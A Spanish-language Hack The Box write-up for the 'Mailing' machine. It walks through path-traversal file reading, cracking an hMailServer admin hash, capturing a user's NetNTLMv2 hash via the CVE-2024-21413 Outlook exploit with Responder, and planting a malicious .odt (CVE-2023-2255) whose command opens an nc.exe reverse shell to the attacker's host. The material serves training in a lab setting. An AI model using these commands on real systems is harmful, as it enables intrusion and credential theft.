---
tags:
permalink: /Mailing-HTB-Writeup
title: Mailing - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimento

```bash
nmap -sCV -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,60456 10.10.11.14
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 01:21 EDT
Nmap scan report for 10.10.11.14
Host is up (0.44s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 IDLE RIGHTS=texkA0001 QUOTA completed CAPABILITY NAMESPACE OK CHILDREN SORT ACL IMAP4rev1
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp   open  ssl/imap      hMailServer imapd
|_imap-capabilities: IMAP4 IDLE RIGHTS=texkA0001 QUOTA completed CAPABILITY NAMESPACE OK CHILDREN SORT ACL IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
60456/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-15T05:24:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 222.81 seconds
```
## Website

Vemos que se nos presenta una web, con 0 información de la cual nos podamos aprovechar, salvo los nombres de usuario que hay en ellas.

![Pasted image 20251015182909](images/Pasted image 20251015182909.png)
`
Podemos anotar estos nombre en un archivo `users` donde podemos seguir las distintas nomenclaturas de un `Active Directory` como ya sabemos y ademas los nombres solo.
Ademas si clickeamos en el boton de `Download Instructions` vemos que se nos descarga un `pdf` en el que se habla de configuracion del servicio que corre por detras (`hMailServer`). Y ademas podemos ver que dentro del contenido del `pdf` hay una filtracion de informacion, viendo asi el nombre de un usuario: 

`maya`

![image-20240506135209562](images/image-20240506135209562.webp)

Vemos que los nombres vienen seguido del nombre de la maquina `maya@mailing.htb`, `ruy@mailing.htb`, etc.
Ademas cuando previamente tocamos en el boton para la descarga del archivo abajo vemos que la peticion se tramita a `/download.php?file=instructions.pdf`, asi que podriamos intentar abusar de ese parametro e intentar leer archivos del sistema con `curl`.

```bash
curl http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

127.0.0.1       mailing.htb
```

Intente muchos payloads, entre ellos `../../C:\windows\system32\drivers\etc\hosts`, pero en este caso me funciono sin tener que mencionar el disco.
Como sabemos que detrás se corre `hMailServer` podríamos hacer una búsqueda para saber donde se ubican los archivos de configuración de este servicio.

![Untitled 58 1](images/Untitled 58 1.jpg)

En mi caso descubri que la ruta de los archivos de configuracion se ubican en : `Program files(x86)\hMailServer\Bin\hMailServer.ini`, dandonos asi este output.

```bash
[Directories]

ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

Vemos un hash de contraseña para el usuario `administrator`. asi que nos vamos a `crackstation`, para ver si logra romperlo.

![Untitled 59 1](images/Untitled 59 1.jpg)

Vemos que logra y nos da como resultado --> `homenetworkingadministrator`, podriamos probar si la misma se reutiiliza para alguno de los usuarios.

```bash
crackmapexec winrm 10.10.11.14 -u ruy -p 'homenetworkingadministrator' 
SMB         10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
HTTP        10.10.11.14     5985   MAILING          [*] http://10.10.11.14:5985/wsman
WINRM       10.10.11.14     5985   MAILING          [-] MAILING\ruy:homenetworkingadministrator
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/mailing]
└─# crackmapexec winrm 10.10.11.14 -u maya -p 'homenetworkingadministrator' 
SMB         10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
HTTP        10.10.11.14     5985   MAILING          [*] http://10.10.11.14:5985/wsman
WINRM       10.10.11.14     5985   MAILING          [-] MAILING\maya:homenetworkingadministrator
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/mailing]
└─# crackmapexec smb 10.10.11.14 -u maya -p 'homenetworkingadministrator'   
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/mailing]
└─# crackmapexec smb 10.10.11.14 -u ruy -p 'homenetworkingadministrator'  
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruy:homenetworkingadministrator STATUS_LOGON_FAILURE
```

Pero vemos que no tenemos exito en ninguo de los servicios de autenticacion. Como vemos que en el archivo que nos descargamos desde la web se menciona outlook y al final menciona que `maya` revisa continuamente los correos podriamos tratar de enviar un mail probando las credenciales para ver si nos logramosa autenticar.

```bash
sendemail -f administrator@mailing.htb -xu administrator@mailing.htb -xp homenetworkingadministrator -t maya@mailing.htb -u 'mira este file' -s 10.10.11.14 -v -m 'hola'
Oct 15 02:42:01 kali sendemail[10458]: DEBUG => Connecting to 10.10.11.14:25
Oct 15 02:42:01 kali sendemail[10458]: DEBUG => My IP address is: 10.10.16.2
Oct 15 02:42:02 kali sendemail[10458]: SUCCESS => Received:     220 mailing.htb ESMTP
Oct 15 02:42:02 kali sendemail[10458]: INFO => Sending:         EHLO kali.local
Oct 15 02:42:02 kali sendemail[10458]: SUCCESS => Received:     250-mailing.htb, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Oct 15 02:42:02 kali sendemail[10458]: DEBUG => SMTP-AUTH: Using LOGIN authentication method
Oct 15 02:42:02 kali sendemail[10458]: INFO => Sending:         AUTH LOGIN
Oct 15 02:42:02 kali sendemail[10458]: SUCCESS => Received:     334 VXNlcm5hbWU6
Oct 15 02:42:02 kali sendemail[10458]: INFO => Sending:         YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
Oct 15 02:42:02 kali sendemail[10458]: SUCCESS => Received:     334 UGFzc3dvcmQ6
Oct 15 02:42:02 kali sendemail[10458]: INFO => Sending:         aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
Oct 15 02:42:03 kali sendemail[10458]: SUCCESS => Received:     235 authenticated.
Oct 15 02:42:03 kali sendemail[10458]: DEBUG => User authentication was successful (Method: LOGIN)
Oct 15 02:42:03 kali sendemail[10458]: INFO => Sending:         MAIL FROM:<administrator@mailing.htb>
Oct 15 02:42:03 kali sendemail[10458]: SUCCESS => Received:     250 OK
Oct 15 02:42:03 kali sendemail[10458]: INFO => Sending:         RCPT TO:<maya@mailing.htb>
Oct 15 02:42:03 kali sendemail[10458]: SUCCESS => Received:     250 OK
Oct 15 02:42:03 kali sendemail[10458]: INFO => Sending:         DATA
Oct 15 02:42:03 kali sendemail[10458]: SUCCESS => Received:     354 OK, send.
Oct 15 02:42:03 kali sendemail[10458]: INFO => Sending message body
Oct 15 02:42:03 kali sendemail[10458]: Setting content-type: text/plain
Oct 15 02:42:05 kali sendemail[10458]: SUCCESS => Received:     250 Queued (1.422 seconds)
Oct 15 02:42:05 kali sendemail[10458]: Email was sent successfully!  From: <administrator@mailing.htb> To: <maya@mailing.htb> Subject: [mira este file] Server: [10.10.11.14:25]
```

En mi caso anteriormente probe proporcionando solo el nombre del usuario al que le pertenece la contraseña (`--> Administrator`) pero no tuve exito. Pero al indicar como nombre de usuario y ademas colocando el dominio vemos que si.

### Estrategia

Mi estragia desde ahora ya que sabemos que `maya` revisa los mail podriamos intentar alguna manera de obtener un hash de ella o de alguna manera de ganar acceso como ella, ademas si le prestamos un poco de atencion al `pdf` vemos que ella maneja `outlook` por lo que podríamos tratar de buscar algún `cve` en sistemas `Windows` y para algun servicio de `mails`.

Buscando un poco me cruce con este [enlace](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)
Donde se trata de una vulnerabilidad en `zeroday` en `Microsoft Outlook`.

>**Vulnerabilidad:** Es una falla en el manejo de enlaces, específicamente la que involucra el protocolo de enlace "MonikerLink" en Outlook.
>**Impacto:** Permite a un atacante enviar un correo electrónico especialmente manipulado que puede **omitir las medidas de seguridad** (como la Vista Protegida de Outlook)

Podemos usar la herramienta del enlace que nos automatiza todo el proceso. Y asi poder conseguir un `hash NetNTLMv2` atraves de `Responder`.

## Shell as `maya`

Primero iniciamos `Responder` por la interfaz de red `tun0` para tratar de interceptar la comuncacion.

```bash
python3 CVE-2024-21413.py --server 10.10.11.14 --port 587 --username 'administrator@mailing.htb' --password 'homenetworkingadministrator' --sender 'administrator@mailing.htb' --recipient maya@mailing.htb --url "\\10.10.16.2/test" --subject 'Mira esto:'

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```

Y asi vemos la respueste en la consola con la que corremos nuestro `Responder`.

```bash
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>

[+] Listening for events...                                                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:9d01bcc6540af708:4F41A047D62E6AE4FF815E87B025EC16:010100000000000000E0A6577E3DDC01BDE7B9A12AAD335F0000000002000800360039005200470001001E00570049004E002D0058005000350053004200460044004D0044005900570004003400570049004E002D0058005000350053004200460044004D004400590057002E0036003900520047002E004C004F00430041004C000300140036003900520047002E004C004F00430041004C000500140036003900520047002E004C004F00430041004C000700080000E0A6577E3DDC01060004000200000008003000300000000000000000000000002000006D0C678F8AB88E3F5BC2DDC183B5A4708E1D57F55DAEFD8A88B4C0DBF8851A270A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000                                        
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
```

Y una vez tenemos el hash podemos tratar de romperlo con `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m4y4ngs4ri       (maya)     
1g 0:00:00:00 DONE (2025-10-15 02:58) 1.190g/s 7070Kp/s 7070Kc/s 7070KC/s m61405..m1nn11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Ya una vez tenemos la contraseña de `maya`, verificamos si nos podemos conectar a `WinRM`.

```bash
crackmapexec smb 10.10.11.14 -u maya -p 'm4y4ngs4ri'                                   
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/mailing]
└─# crackmapexec winrm 10.10.11.14 -u maya -p 'm4y4ngs4ri'
SMB         10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
HTTP        10.10.11.14     5985   MAILING          [*] http://10.10.11.14:5985/wsman
WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

```powershell
evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\maya\Documents>
```

## Shell as localadmin

Vemos que en el directorio raiz, hay una carpeta llamada `Important Documents` y tenemos permisos de escritura, ya que podemos escribir documentos, como vemos acontinuacion.

```powershell
*Evil-WinRM* PS C:\> cd "Important Documents"
dir
*Evil-WinRM* PS C:\Important Documents> dir
*Evil-WinRM* PS C:\Important Documents> echo "zs1n" > test.txt
*Evil-WinRM* PS C:\Important Documents> type test.txt
zs1n
```

Y otro detalle a tener en cuenta es que `LibreOffice` es un programa disponible en la carpeta `Program Files`.

```bash
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
d-----         2/27/2024   4:58 PM                Reference Assemblies
d-----         3/13/2024   4:48 PM                RUXIM
d-----         2/27/2024   4:32 PM                VMware
d-----          3/3/2024   5:13 PM                Windows Defender
d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
d-----          3/3/2024   5:13 PM                Windows Mail
d-----          3/3/2024   5:13 PM                Windows Media Player
d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
d-----         2/27/2024   4:26 PM                Windows NT
d-----          3/3/2024   5:13 PM                Windows Photo Viewer
d-----         4/29/2024   6:54 PM                Windows Portable Devices
d-----         12/7/2019  10:31 AM                Windows Security
d-----         3/13/2024   4:49 PM                WindowsPowerShell
```

Si nos metemos a su carpeta, vemos que ademas hay una subcarpeta `program` con un archivo donde podemos ver la version de `LibreOffice`.

```powershell

*Evil-WinRM* PS C:\Program Files> cd LibreOffice
dir
*Evil-WinRM* PS C:\Program Files\LibreOffice> dir


    Directory: C:\Program Files\LibreOffice


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/4/2024   6:57 PM                help
d-----          3/4/2024   6:57 PM                presets
d-----         3/14/2024   4:01 PM                program
d-----          3/4/2024   6:57 PM                readmes
d-----          3/4/2024   6:57 PM                share
-a----         6/10/2022   4:14 PM        1807470 CREDITS.fodt
-a----          7/7/2022   1:05 PM         574491 LICENSE.html
-a----          7/7/2022   1:09 PM         503055 license.txt
-a----          7/6/2022  11:40 PM           3706 NOTICE

```

Listamos el contenido.

```powershell
*Evil-WinRM* PS C:\Program Files\LibreOffice> cd program
*Evil-WinRM* PS C:\Program Files\LibreOffice\program> type version.ini
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
MsiProductVersion=7.4.0.1
ProductCode={A3C6520A-E485-47EE-98CC-32D6BB0529E4}
ReferenceOOoMajorMinor=4.1
UpdateChannel=
UpdateID=LibreOffice_7_en-US_af_am_ar_as_ast_be_bg_bn_bn-IN_bo_br_brx_bs_ca_ca-valencia_ckb_cs_cy_da_de_dgo_dsb_dz_el_en-GB_en-ZA_eo_es_et_eu_fa_fi_fr_fur_fy_ga_gd_gl_gu_gug_he_hsb_hi_hr_hu_id_is_it_ja_ka_kab_kk_km_kmr-Latn_kn_ko_kok_ks_lb_lo_lt_lv_mai_mk_ml_mn_mni_mr_my_nb_ne_nl_nn_nr_nso_oc_om_or_pa-IN_pl_pt_pt-BR_ro_ru_rw_sa-IN_sat_sd_sr-Latn_si_sid_sk_sl_sq_sr_ss_st_sv_sw-TZ_szl_ta_te_tg_th_tn_tr_ts_tt_ug_uk_uz_ve_vec_vi_xh_zh-CN_zh-TW_zu
UpdateURL=https://update.libreoffice.org/check.php
UpgradeCode={4B17E523-5D91-4E69-BD96-7FD81CFA81BB}
UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation
```

Y si buscamos por la version `7.4.0.1` en google vemos que al parecer esta version es vulnerable a una escalada de privilegios en este [enlace](https://github.com/elweth-sec/CVE-2023-2255) podemos ver un `PoC`.
Nos lo clonamos a nuestra maquina y lo ejecutamos pasandole con el parametro `--cmd` algun comando a ejecutar una vez que la persona victima lo ejecute.

```bash
python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.16.2 443" --output payload.odt
File payload.odt has been created !
```

Vemos que nos crea un `.odt`, el cual lo podemos subir a la maquina y como la unica carpeta sospechosa es `Important Documents` lo colocamos ahi y en la ruta `C:\ProgramData` descargamos el `nc.exe`.

```bash
rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.14 57717
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program> whoami
mailing\localadmin
```

Y asi vemos que conseguimos la shell como el usuario `Domain Admin` de la maquina. `localadmin`.

```bash
C:\Users>cd localadmin\desktop & type root.txt
cd localadmin\desktop & type root.txt
f18c5ef402fc6f667380f94a9b9c2c4e
```

`~Happy Hacking`